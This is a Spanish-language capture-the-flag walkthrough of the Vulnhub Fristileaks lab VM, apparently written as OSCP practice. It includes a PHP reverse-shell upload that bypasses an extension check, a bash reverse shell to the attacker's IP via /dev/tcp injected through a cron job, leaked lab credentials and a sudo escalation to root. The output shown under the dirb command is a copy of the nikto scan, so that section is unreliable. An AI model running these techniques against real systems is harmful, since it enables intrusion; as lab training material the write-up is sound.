---
layout: post
title: Fristileaks - Walkthrough
date: 2020-02-19 20:44
description: Walkthrough - Fristileaks
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough

---

## **Walkthrough de Fristileaks**
---

## **Links**
[Fristileaks en Vulnhub](https://www.vulnhub.com/entry/fristileaks-13,133/)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.123`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 15:46 -03
Nmap scan report for 10.0.0.123
Host is up (0.00012s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 167.42 seconds
```

>**`nmap -A -T4 -p 80 10.0.0.123 -oA Fristileaks`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 15:49 -03
Nmap scan report for 10.0.0.123
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.12 ms 10.0.0.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
```

### **Protocolo HTTP (80)**
---
>**``nikto -h 10.0.0.123``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.123
+ Target Hostname:    10.0.0.123
+ Target Port:        80
+ Start Time:         2020-02-18 15:50:59 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 15:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8701 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-02-18 15:51:11 (GMT-3) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
>**``dirb http://10.0.0.111 /usr/share/wordlists/dirb/big.txt``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.123
+ Target Hostname:    10.0.0.123
+ Target Port:        80
+ Start Time:         2020-02-18 15:50:59 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 15:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8701 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-02-18 15:51:11 (GMT-3) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
---

Entrando a http://10.0.0.123 se presenta una página de home de login:

---

![img]({{ '/assets/images/Fristileaks/login_00.png' | relative_url }}){: .center-image }*(Login)*

---

Teniendo en cuenta el resultado de **Dirb** hay varios directorios no idexables según el [archivo](https://es.wikipedia.org/wiki/Est%C3%A1ndar_de_exclusi%C3%B3n_de_robots) **robots.txt** que fue encontrado en el servidor web. Al entrar a cada uno de esos tres directorios se nos presenta la siguiente imagen:

---

![img]({{ '/assets/images/Fristileaks/robots.png' | relative_url }}){: .center-image }*(Robots.txt)*

---

![img]({{ '/assets/images/Fristileaks/obiwan.png' | relative_url }}){: .center-image }*(These are not the droids...)*

---

Dando a entender que todavía falta un directorio por descubrir, hay que pensarlo un poco (Lo pensé mucho y no me salió) pero cada directorio tiene el nombre de una bebida: **Cola, Beer y Sisi**. Resulta que el nombre de la VM que queremos romper también es una bebida:

---

![img]({{ '/assets/images/Fristileaks/fristi.png' | relative_url }}){: .center-image }*(Quien lo diría, es una bebida)*

---

Entonces si se prueba ingresar a http://10.0.0.123/fristi aparece la siguiente página:

---

![img]({{ '/assets/images/Fristileaks/login_01.png' | relative_url }}){: .center-image }*(Login)*

---

Lo primero que hice fue ver el código fuente y aparecieron dos comentarios que entregaron bastante información:

![img]({{ '/assets/images/Fristileaks/user.png' | relative_url }}){: .center-image }*(Nombre de usuario revelado)*

```console
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
```

Lo que quiere decir con esto es que la imagen de Nelson que se ve en la página no es una referencia a un archivo dentro del file system del servidor web sino que está directamente embebida en el código HTML, previa conversión a base64.


Por otro lado, después del choclo de información que siginifica la imagen codificada den base64 existe el siguiente comentario:

```console
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
```

---

Lo único que tuve que teniendo ese código en la mano fue pegarlo en un archivo, decodificarlo y guardarlo con extensión PNG:

>**``base64 -d password > password.png``**

Y lo siguiente que aparece si abrimos la imágen resultante es el password:


>**``KeKkeKKeKKeKkEkkEk``**

---

![img]({{ '/assets/images/Fristileaks/password.png' | relative_url }}){: .center-image }*(Nanananana)*

---

Así que tenemos:

 - Usuario: **eezeepz**
 - Password: **KeKkeKKeKKeKkEkkEk**

Si pruebo de loguearme con esa credenciales tengo éxito y se presenta la siguiente página de upload:

---

![img]({{ '/assets/images/Fristileaks/upload_00.png' | relative_url }}){: .center-image }*(Página de Upload)*

---

Genial. ¿De que sirve poder subir un archivo de imágen a un servidor? No sirve de mucho a menos que en vez de una imágen se pueda subir algo que se ejecute del lado del servidor. Por ejemplo una shell reversa de PHP, si la persona que programó el archivo ``upload.php`` se puso las pilas entonces al tocar el botón ``Upload Image`` se debería validar que no estoy subiendo nada más que un archivo de imagén:

---

![img]({{ '/assets/images/Fristileaks/upload_01.png' | relative_url }}){: .center-image }*(Tratando de subir una shell inversa en PHP)*

---

![img]({{ '/assets/images/Fristileaks/upload_02.png' | relative_url }}){: .center-image }*(Hubiera sido muy fácil...)*

---

Existen varias formas de validar el tipo de contenido que se está subiendo a un servidor, las que más he visto (en mi poca experiencia) son las que chequean la extensión o las que chequean el tipo de archivo que se está subiendo ([Magic Bytes](https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/)).

Hay un excelente [documento](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf) que las enumera, muestra el código detrás de cada una y muestra como hacer bypass.

Voy a tener que usar **Burp Suite** para capurar el tráfico web entre las VM atacantes y victima y poder modificarlo.

La opción más fácil fue agregarle la extensión .png ``php-reverse-shell.php``

>**``cp php-reverse-shell.php php-reverse-shell.php.png``**

Y al tratar de subir el archivo todo va Ok, el script de upload validaba la extensión de lo que se subía.

---

![img]({{ '/assets/images/Fristileaks/upload_03.png' | relative_url }}){: .center-image }*(Hubiera sido muy fácil...)*

---

Ahora solo resta acceder al link mencionado previamente habiendo abierto una sesiéon para recibir la conexión reversa con **Netcat**:

>**``nc -nlvp 1234``**

En el momento que se ingresa a **http://10.0.0.123/fristi/uploads/php-reverse-shell.php.png** se recibe la conexión!!

```console
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.0.123.
Ncat: Connection from 10.0.0.123:56200.
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:49:30 up 21:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$ whoami
whoami
apache
sh-4.1$ pwd
/
pwd
sh-4.1$ 
```
---

## **Reconocimiento**

---

Dentro de la carpeta ``/var/www`` se puede encontrar un archivo llamado ``notes.txt`` con el siguiente contenido:

```console
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

Ya tengo el nombre de dos usuarios: **eezeepz y jerry**

Dentro de la carpeta ``/var/www/fristi`` se encuentra un archivo llamado ``checklogin.php`` y contiene las credenciales para la base de datos:

```console
<?php

ob_start();
$host="localhost"; // Host name
$username="eezeepz"; // Mysql username
$password="4ll3maal12#"; // Mysql password
$db_name="hackmenow"; // Database name
$tbl_name="members"; // Table name
```
Yendo a la carpeta ``/home`` se encuentarn 3 carpetas de usuarios: **admin, eezeepz y fristigod**. La única carpeta accesible es la eezeepz y contiene varios comandos o utilidades de Linux y un interesante archivo llamado ``notes.txt``. Nuevamente una nota de Jerry con pistas...

```console
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```
Entonces el hay un cronjob que busca el archivo ``runthis`` en ``/tmp`` y ejecuta lo que hay, previamente validando que el comando empiece con ``/home/admin``. Después de tratar un par de cosas terminé haciendo que el archivo ``runthis`` ejecute una shell reversa con bash con los privilegios del usuario **admin** lo cual me permitió ingresar a su directorio home.

> **``/home/admin/../../bin/bash -i >& /dev/tcp/10.0.0.122/4444 0>&1``**

Exito!!

Hay 3 archivos importantes dentro de la carpeta home del usuario *admin*:
 - cryptedpass.txt
 - whoisyourgodnow.txt
 - cryptpass.py

El archivo ``cryptedpass.txt`` parece ser el resultante de de una cadena te texto que se la pasa al script ``cryptpass.py`` y no es más que una codificación **Base64** y una posterior **Rot13**:

---

```console
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

---


Los archivos ``whoisyoutgodnow.txt`` y ``cryptedpass.txt`` están ambos encriptados con el script mencionado. Modificando un poco el codigo de script o usando portales online para desencriptarlos da como resultado que son el password de los usuarios **fristigod** y **admin** respectivamente.

Volviendo a nuestro shell reverso sin privilegios del principio hay que lograr una terminal buena y gracias a que la VM victima tiene **Python** instalado se hace corriendo el suguiente comando:

>**``python -c 'import pty; pty.spawn("/bin/sh")'``**

Una vez que se obtiene la terminal se puede pasar a los usuarios con mayores privilegios a través del comando ``su``:

```console
python -c 'import pty; pty.spawn("/bin/sh")'
sh-4.1$ su admin
su admin
Password: thisisalsopw123

[admin@localhost tmp]$ whoami
whoami
admin
[admin@localhost tmp]$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
whoami
fristigod
```
---

Voy a saltear al usuario admin e ir directamente a **Fristigod**...

---

Como último escalamiento de privilegios solo resta llegar a **root**, ejecutando el comando ``sudo -l`` se reveló información importante:

> **``sudo -l``**

```console
Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

A lo que hay que prestar atención acá es que dice que el usuario **fristi** (no fristigod) pueden correr el comando ``/var/fristigod/.secret_admin_stuff/doCom`` con ``sudo``. Entonces el parámetro ``-u [usuario]`` de ``sudo`` nos permite hacer lo que necesitamos.

>**``sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom``**

```console
Usage: ./program_name terminal_command
```
---

Al correr el comando se necesita un terminal_command. ¿Que tal si ese comando es ``/bin/bash``?

```console
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
bash-4.1# whoami
whoami
root
```
---

### **Flag**

---
Dentro de la carpeta ``/root`` existe una archivo llamado ``fristileaks_secrets.txt`` su contenido:

```console
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

---


